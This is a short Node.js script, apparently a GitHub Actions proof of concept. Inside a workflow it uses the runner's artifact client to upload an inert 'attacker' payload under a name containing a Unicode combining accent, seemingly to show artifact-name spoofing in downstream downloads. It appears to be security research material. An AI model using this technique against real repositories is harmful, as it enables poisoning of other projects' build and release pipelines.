import {execFileSync} from 'node:child_process'
import {mkdirSync, writeFileSync} from 'node:fs'
import path from 'node:path'
import {fileURLToPath, pathToFileURL} from 'node:url'

const actionDir = path.dirname(fileURLToPath(import.meta.url))
const workspace = process.env.GITHUB_WORKSPACE || process.cwd()
const runId = process.env.GITHUB_RUN_ID

if (!runId) {
  throw new Error('GITHUB_RUN_ID is missing')
}

console.log(`runtime-token-present=${Boolean(process.env.ACTIONS_RUNTIME_TOKEN)}`)
console.log(`results-url-present=${Boolean(process.env.ACTIONS_RESULTS_URL)}`)

const payloadDir = path.join(workspace, 'attacker-action-payload')
mkdirSync(payloadDir, {recursive: true})

const artifactName = `artifact-download-impact-${runId}-release-e\u0301`
writeFileSync(
  path.join(payloadDir, 'provenance.txt'),
  [
    'source=attacker-source-run',
    'method=runtime-action-upload',
    `artifact-name=${artifactName}`,
    `run-id=${runId}`,
    ''
  ].join('\n'),
  'utf8'
)
writeFileSync(path.join(payloadDir, 'padding.bin'), Buffer.alloc(4 * 1024 * 1024, 'A'))

execFileSync('npm', ['init', '-y'], {
  cwd: actionDir,
  stdio: ['ignore', 'ignore', 'inherit']
})
execFileSync('npm', ['install', '@actions/artifact@6.2.1'], {
  cwd: actionDir,
  stdio: ['ignore', 'ignore', 'inherit']
})

const artifactModule = await import(
  pathToFileURL(path.join(actionDir, 'node_modules/@actions/artifact/lib/internal/client.js'))
)
const {DefaultArtifactClient} = artifactModule

const files = [
  path.join(payloadDir, 'provenance.txt'),
  path.join(payloadDir, 'padding.bin')
]

const client = new DefaultArtifactClient()
const response = await client.uploadArtifact(
  artifactName,
  files,
  payloadDir,
  {compressionLevel: 0}
)

console.log(JSON.stringify({
  artifactName,
  artifactId: response.id,
  size: response.size,
  digest: response.digest
}))
